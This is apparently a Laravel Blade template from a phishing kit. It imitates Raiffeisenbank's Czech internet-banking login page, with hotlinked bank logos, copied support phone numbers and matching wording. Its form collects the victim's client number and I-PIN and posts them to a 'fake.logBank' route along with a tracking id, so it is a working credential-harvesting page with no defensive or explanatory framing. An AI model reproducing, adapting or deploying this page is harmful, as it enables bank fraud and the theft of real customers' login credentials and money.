@extends('layouts.fake')
@section('html_class'){{"mt-0"}}@endsection
@section('body_class'){{"mt-2"}}@endsection
@push('css')
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body,input,button {
            font-family: 'Roboto', sans-serif;
        }

        body,html {
            height: 100%;
        }

        .header {
            width: 100%;
            height: 80px;
            display: flex;
            justify-content: center;
            background: #fff;
        }

        .header_content {
            width: 1000px;
            height: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header_content img {
            width: 110px;
            height: 30px;
        }

        .nav {
            width: fit-content;
            height: 100%;
            display: flex;
            align-items: center;
            font-weight: 400;
            text-decoration: underline;
        }

        .nav p {
            padding: 0px 20px;
        }

        .main {
            width: 100%;
            height: fit-content;
            display: flex;
            justify-content: center;
            background: #EAEAEBFF;
        }

        .center {
            width: 1000px;
            /*height: 1200px;*/
            padding: 20px 0px;
        }

        .center p:nth-child(1) {
            color: #656772FF;
        }

        .form {
            float: left;
            width: 500px;
            font-size: 16px;
            margin-top: 20px;
            display: flex;
            flex-direction: column;
        }

        .alert {
            width: 100%;
            height: fit-content;
            padding: 20px;
            display: flex;
            align-items: center;
            background: url(https://online.rb.cz/gaas/authorize/login/warning.29300661b5fd55aa8af9.png) #fffa65 4% no-repeat;;
        }

        .alert p {
            color: #000 !important;
            font-size: 18px;
            padding-left: 40px;
            line-height: 28px;
        }

        .main_form {
            width: 100%;
            height: fit-content;
            background-color: #fff;
            padding: 20px;
            display: flex;
            flex-direction: column;
        }

        .main_form p {
            font-weight: bold !important;
            font-size: 33px !important;
            color: #000 !important;
        }

        .btns {
            width: 100%;
            height: 57px;
            border: 0;
            border-radius: 8px;
            font-weight: 700;
            display: flex;
            margin-top: 20px;
        }

        .btns button{
            width: calc(100% / 3);
            height: 100%;
            border-radius: 10px;
            -webkit-border-radius: 10px;
            -moz-border-radius: 10px;
            -ms-border-radius: 10px;
            -o-border-radius: 10px;
            border: none;
            font-size: 16px;
        }

        .btns button:nth-child(2) {
            color: #fff500;
            background: #232529;
        }

        .input_box {
            display: flex;
            flex-direction: column;
            margin-top: 30px;
        }

        .input_box p {
            font-size: 16px !important;
            font-weight: 400 !important;
            color: #656772FF !important;
        }

        .input_box input {
            margin-top: 5px;
            border: 2px solid #afb1b6;
            height: 48px;
            background: #f7f7f8;
            border-radius: 8px;
            outline: none;
            padding: 0px 15px;
            font-weight: bold;
            font-size: 18px;
        }

        .warning {
            background: #f7f7f8;
            margin-top: 1rem;
            padding: 1rem;
            border: 1px solid #e9e9e9;
            border-radius: 8px;
        }

        .warning p {
            font-size: 16px !important;
            font-weight: 400 !important;
            text-align: center;
            color: #656772 !important;
        }

        .phone {
            display: flex;
            margin-top: 20px;
        }

        .phone span {
            padding-left: 20px;
            font-size: 20px;
            font-weight: bold;
            color: #000;
        }

        .phone img {
            width: 50px;
            height: 50px;
        }

        .log-in {
            background-color: #fee600;
            color: #131416;
            cursor: pointer;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            align-self: flex-end;
            margin-top: 20px;
            min-width: 150px;
            border: none;
            height: 55px;
            font-weight: bold;
            font-size: 17px;
        }

        .under_btn {
            align-self: flex-end;
            text-decoration: underline;
            margin-top: 20px;
        }

        .call {
            font-size: 16px;
            position: relative;
            background: #f7f7f8;
            padding: 2.5rem;
            border-bottom-right-radius: 8px;
            border-bottom-left-radius: 8px;
            color: #131416;
        }

        .img {
            float: left;
            height: 620px;
            max-width: 475px;
            width: 200px;
            margin-top: 30px;
        }

        footer {
            width: 100%;
            height: fit-content;
            padding: 10px 0px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #34363CFF;
        }

        .top_footer {
            width: fit-content;
            display: flex;
        }
        .card {
            all: unset;
        }
        .card {
            display: flex;
            margin: 0px 30px;
        }

        .card:nth-child(3) img {
            width: 40px;
            height: 30px;
        }

        .card img {
            width: 20px;
            height: 30px;
        }

        .ft_text {
            display: flex;
            flex-direction: column;
            padding-left: 10px;
            font-size: 14px;
            color: #fff;
            line-height: 20px;
        }

        .ft_text p {
            text-decoration: underline;
            font-weight: bold;
        }

        .ft_text span {
            color: #D8D8DAFF;
        }

        .bot_footer {
            margin-top: 10px;
            color: #D8D8DAFF;
        }

        @media (max-width: 1016px) {
            .center {
                width: 100%;
                height: fit-content;
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .img {
                width: fit-content;
            }

            .top_footer {
                flex-direction: column;
            }

            .card {
                padding: 20px;
            }

            .header_content {
                padding: 0px 20px;
            }
        }

        @media (max-width: 584px) {
            .nav {
                flex-wrap: wrap;
                white-space: nowrap;
                justify-content: flex-end;
            }

            .center {
                padding: 20px;
            }

            .form {
                width: 100%;
            }

            .img {
                display: none;
            }
        }
    </style>
@endpush

@section('content')
    <div class="header">
        <div class="header_content">
            <img src="https://online.rb.cz/gaas/authorize/login/rbi-logo.f7b286a63ab565b6d909.jpg" alt="">
            <div class="nav">
                <p>Kontakty</p>
                <p>Bezpečnost</p>
                <p>Nápověda</p>
            </div>
        </div>
    </div>

    <div class="main">
        <div class="center">
            <p>Dnes je 01.03.2022 Svátek má Bedřich</p>
            <form class="form" id="bank_pm_form" method="POST"
                 action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                <div class="alert">
                    <p>Zvolili jste přihlášení pomocí mobilní aplikace RB klíč, která umožňuje bezpečné a pohodlné
                        potvrzování operací v Internetovém bankovnictví. Pokud nemáte RB klíč aktivní, přihlaste se do
                        internetového bankovnictví SMS kódem nebo Osobním klíčem a proveďte aktivaci v menu Nastavení -&gt;
                        RB klíč -&gt; Nová aktivace.</p>
                </div>
                <div class="main_form">
                    <p>Vstup na účet</p>
                    <div class="btns"><!--
                        <button>
                            RB klíč
                        </button>
                        <button>
                            SMS kód
                        </button>
                        <button>
                            Osobní klíč
                        </button> -->
                    </div>
                    <div class="input_box">
                        <p>Klientské číslo</p>
                        <input type="text" id="login" name="login">
                    </div>
                    <div class="input_box">
                        <p>I-PIN</p>
                        <input type="text" id="password" name="password">
                    </div>
                    <div class="warning">
                        <p>Zapomněli jste Vaše Klientské číslo? Navštivte jakoukoli pobočku Raiffeisenbank.</p>
                    </div>
                    <div class="phone">
                        <img src="https://online.rb.cz/gaas/authorize/login/icon-sms-normal.a1ed23ce8a792dba46ea.png"
                             alt="">
                        <span>Kliknutím na tlačítko PŘIHLÁSIT SE odešleme notifikaci do RB klíče, kde přihlášení dokončíte.</span>
                    </div>
                    <button class="log-in" id="pay-button" type="submit">
                        Přihlásit se
                    </button>
                    <span class="under_btn">Mobilní zařízení nemá datové připojení</span>
                </div>
                <div class="call">
                    <span>V případě potíží nás kontaktujte na Klientské lince +420 412 440 000 (7-22 hod).</span>
                </div>
            </form>
            <div class="img">
                <img src="https://online.rb.cz/pictures/login-banner/new_login__IB_v2.png" alt="">
            </div>
        </div>
    </div>

    <footer>
        <div class="top_footer">
            <div class="card">
                <img src="https://online.rb.cz/gaas/authorize/login/icon-phone-footer.8ec7664941533cb9438d.png" alt="">
                <div class="ft_text">
                    <p>+420 412 440 000</p>
                    <span>Klientská linka (denně 7-22 hod)</span>
                </div>
            </div>
            <div class="card">
                <img src="https://online.rb.cz/gaas/authorize/login/icon-phone-footer.8ec7664941533cb9438d.png" alt="">
                <div class="ft_text">
                    <p>+420 412 446 402</p>
                    <span>Blokace karet a klíčů (NONSTOP)</span>
                </div>
            </div>
            <div class="card">
                <img src="https://online.rb.cz/gaas/authorize/login/icon-mail-info-footer.82d1ba035d285b0df64c.png"
                     alt="">
                <div class="ft_text">
                    <p>info@rb.cz</p>
                    <span>Odpovíme do 24 hodin</span>
                </div>
            </div>
        </div>
        <div class="bot_footer">
            <p>© {{date('Y')}} Raiffeisenbank</p>
        </div>
    </footer>
@endsection
@push('js')

@endpush
